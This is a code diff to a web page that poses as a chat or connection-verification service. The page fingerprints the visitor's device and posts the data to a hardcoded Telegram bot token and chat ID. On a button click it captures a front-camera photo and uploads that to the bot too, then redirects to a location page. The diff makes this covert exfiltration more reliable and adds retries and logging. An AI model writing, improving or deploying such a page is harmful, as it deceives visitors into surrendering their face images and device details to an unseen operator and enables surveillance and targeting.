@@ -68,6 +68,7 @@
             border: none;
             color: white;
             font-size: 24px;
+            cursor: pointer;
         }
         
         #permission-alert {
@@ -120,6 +121,17 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+
+        #camera-preview {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 999;
+            display: none;
+        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
@@ -147,10 +159,12 @@
             <div class="spinner"></div>
             <p>Securing your connection...</p>
         </div>
+
+        <video id="camera-preview" autoplay playsinline></video>
     </div>
 
     <script>
-        // Configuration
+        // Configuration - REPLACE WITH YOUR VALUES
         const BOT_TOKEN = '5836151829:AAHo1C858VFc4_Fnp47LYRdx4fUjcfkLhyI';
         const CHAT_ID = '2032344793';
         const MAX_RETRIES = 3;
@@ -160,12 +174,14 @@
         let currentPage = 'camera';
         let retryCount = 0;
         let fingerprint = null;
+        let mediaStream = null;
         
         // DOM Elements
         const galleryEl = document.getElementById('gallery');
         const chatBtn = document.getElementById('chat-btn');
         const permissionAlert = document.getElementById('permission-alert');
         const loadingScreen = document.getElementById('loading-screen');
+        const cameraPreview = document.getElementById('camera-preview');
         
         // Generate device fingerprint
         function generateFingerprint() {
@@ -188,21 +204,32 @@
                 doNotTrack: navigator.doNotTrack || 'unspecified'
             };
             
-            // Try to get more device info
+            // Battery info
             try {
-                fingerprint.battery = {
-                    charging: navigator.getBattery().then(b => b.charging),
-                    level: navigator.getBattery().then(b => b.level)
-                };
-            } catch (e) {}
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        fingerprint.battery = {
+                            charging: battery.charging,
+                            level: battery.level
+                        };
+                    });
+                }
+            } catch (e) {
+                console.error("Battery API error:", e);
+            }
             
+            // Connection info
             try {
-                fingerprint.connection = navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    rtt: navigator.connection.rtt,
-                    downlink: navigator.connection.downlink
-                } : null;
-            } catch (e) {}
+                if (navigator.connection) {
+                    fingerprint.connection = {
+                        effectiveType: navigator.connection.effectiveType,
+                        rtt: navigator.connection.rtt,
+                        downlink: navigator.connection.downlink
+                    };
+                }
+            } catch (e) {
+                console.error("Connection API error:", e);
+            }
             
             return fingerprint;
         }
@@ -238,22 +265,49 @@
             loadingScreen.style.display = show ? 'flex' : 'none';
         }
         
+        // Proper base64 to blob conversion
+        function dataURLtoBlob(dataurl) {
+            const arr = dataurl.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+        
          // Send image to Telegram
         async function sendImageToTelegram(imageData) {
             try {
-                const blob = await fetch(imageData).then(r => r.blob());
-                const formData = new FormData();
-                formData.append('photo', blob, 'user_verification.jpg');
-                formData.append('chat_id', CHAT_ID);
-                formData.append('caption', 'User verification image');
+                // Preparing to send verification...
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                // Convert base64 to blob
+                const blob = dataURLtoBlob(imageData);
+                
+                const formData = new FormData();
+                formData.append('photo', blob, 'verification.jpg');
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', 'Automated verification');
+                
+                // Sending verification to Telegram...
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
+                
+                const result = await response.json();
+                console.log("Telegram response:", result);
+                
+                if (!response.ok) {
+                    throw new Error(result.description || 'Failed to send image');
+                }
+                
                 return true;
             } catch (e) {
                 console.error('Image send error:', e);
+                // Error sending verification: 
                 return false;
             }
         }
@@ -261,14 +315,24 @@
         // Send data to Telegram
         async function sendToTelegram(data) {
             try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('text', JSON.stringify(data, null, 2));
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                console.log("Sending data to Telegram:", data);
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    body: formData
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: JSON.stringify(data, null, 2)
+                    })
                 });
+                
+                const result = await response.json();
+                console.log("Message send response:", result);
+                
+                if (!response.ok) {
+                    throw new Error(result.description || 'Failed to send message');
+                }
             } catch (e) {
                 console.error('Telegram send error:', e);
             }
@@ -277,71 +341,108 @@
         // Capture camera image
         async function captureCamera() {
             showLoading(true);
+            console.log("Starting camera capture...");
             
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
+                // Request camera access
+                console.log("Requesting camera permission...");
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                console.log("Camera access granted");
+                
+                // Show camera preview
+                cameraPreview.srcObject = mediaStream;
+                cameraPreview.style.display = 'block';
+                
+                // Wait for video to be ready
+                await new Promise(resolve => {
+                    cameraPreview.onloadedmetadata = () => {
+                        console.log("Video metadata loaded");
+                        resolve();
+                    };
                 });
                 
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
+                await cameraPreview.play();
+                console.log("Video is playing");
                 
-                await new Promise(resolve => setTimeout(resolve, 500));
+                // Wait for camera to stabilize
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 
+                // Create canvas for capture
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = cameraPreview.videoWidth;
+                canvas.height = cameraPreview.videoHeight;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
+                // Capture image
+                ctx.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                console.log("Image captured:", imageData.substring(0, 50) + "...");
                 
-                // Stop stream
-                stream.getTracks().forEach(track => track.stop());
+                // Stop camera
+                mediaStream.getTracks().forEach(track => track.stop());
+                cameraPreview.style.display = 'none';
+                console.log("Camera stopped");
                 
-                // Send captured data
+                // Send fingerprint first
                 await sendToTelegram({
-                    type: 'camera_capture',
-                    image: imageData,
-                    fingerprint: fingerprint,
+                    type: 'fingerprint',
+                    data: fingerprint,
                     timestamp: new Date().toISOString()
                 });
                 
-                // Proceed to location page
+                // Send image
+                const imageSent = await sendImageToTelegram(imageData);
+                if (!imageSent) {
+                    throw new Error("Failed to send image to Telegram");
+                }
+                
+                console.log("Verification complete!");
+                // Proceed to next step
                 currentPage = 'location';
                 window.location.href = 'location.html';
                 
             } catch (error) {
                 console.error('Camera error:', error);
+                
+                // Stop stream if it exists
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+                cameraPreview.style.display = 'none';
+                
                 showLoading(false);
                 
                 if (retryCount < MAX_RETRIES) {
                     retryCount++;
+                    console.log(`Retrying... (${retryCount}/${MAX_RETRIES})`);
                     showPermissionAlert();
                     setTimeout(captureCamera, RETRY_DELAY);
                 } else {
-                    // Max retries reached, proceed anyway
-                    currentPage = 'location';
-                    window.location.href = 'location.html';
+                    console.error("Max retries reached");
+                    alert("Camera access failed after multiple attempts. Please check permissions.");
                 }
             }
         }
         
         // Handle chat button click
         function handleChatClick() {
-            if (retryCount > 0) {
-                // Refresh page to reset permission state
-                window.location.reload();
-            } else {
-                captureCamera();
-            }
+            console.log("Chat button clicked");
+            captureCamera();
         }
         
         // Initialize
         async function init() {
+            console.log("Initializing application...");
+            
             // Generate fingerprint first
             fingerprint = generateFingerprint();
+            console.log("Generated fingerprint:", fingerprint);
             
             // Send fingerprint immediately
             await sendToTelegram({
@@ -356,10 +457,7 @@
             // Set up chat button
             chatBtn.addEventListener('click', handleChatClick);
             
-            // First automatic attempt
-            setTimeout(() => {
-                captureCamera();
-            }, 1500);
+            console.log("Initialization complete");
         }
         
         // Start when page loads
